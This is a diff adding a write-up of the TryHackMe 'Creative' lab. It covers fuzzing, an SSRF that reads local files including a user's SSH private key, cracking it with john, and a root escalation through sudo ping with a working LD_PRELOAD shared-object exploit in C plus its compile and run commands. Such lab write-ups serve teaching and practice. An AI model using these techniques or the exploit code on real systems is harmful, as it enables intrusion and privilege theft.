@@ -1,4 +1,93 @@
-10.10.164.169
 
-after adding the ip to /etc/hosts i was able to view the website
+https://tryhackme.com/r/room/creative
 
+'Creative' TryHackMe Room
+
+'Exploit a vulnerable web application and some misconfigurations to gain root privileges.'
+
+10.10.72.252
+
+Seems to be a modern web app on port 80
+
+ffuf directory scan only provides one good result:
+
+assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 13ms]
+
+lets fuzz some domains:
+
+ffuf -u http://creative.thm/ -H "Host: FUZZ.creative.thm" -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -ac
+
+results in:
+
+beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 13ms]
+
+lets add this to the /etc/hosts file,
+
+seems to be some weird page to check if a 'url is alive'
+
+lets start a simple python website and a tcpdump to see what this function does
+
+when requesting my website it displays my website, but doesnt load files..
+
+using SSRFMap we ran a port scan on the machine checking for any local ports open, we see there is one open on 1337!
+
+lets try see if theres anything there 'http://127.0.0.1:1337'
+
+shows us the / directory of the system!!
+
+we can now manouvre around using this beta system
+
+http://127.0.0.1:1337/home/saad
+
+and theres a RSA KEY!!
+
+running ssh2john and then running john with the wordlist rockyou.txt gets us the password
+
+sweetness
+
+for user saad
+
+saad:sweetness
+
+adding the keys to my .ssh and chmod 600 on both pub and priv keys allow to use for auth
+
+/home/saad/.bash_history:echo "saad:MyStrongestPasswordYet$4291" > creds.txt
+
+found in logs when running linpeas
+
+sudo -l allows for 
+
+    (root) /usr/bin/ping
+
+it also has some information on an optional enviroment variable called 'LD_PRELOAD', 
+which is used to load shared libaries to a program (presumably before the program is loaded)
+
+we can the create a little script to edit the LD_PRELOAD value to give us a shell, as we have something that 
+can execute as sudo that means when we execute the program we can as sudo, it would give us a root shell as the 
+modified LD_PRELOAD variable would be interferring
+
+https://systemweakness.com/linux-privilege-escalation-with-ld-preload-sudo-a13e0b755ede
+
+This guide has a very indepth explanation and the code required to edit the LD_PRELOAD enviroment variable 
+
+exploit code: exploit.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setuid(0);
+	setgid(0);
+	system("/bin/bash -p");
+}
+
+Compile code:
+gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
+
+run the exploit:
+
+
+# path to exploit, path to file able to execute as sudo
+sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/ping
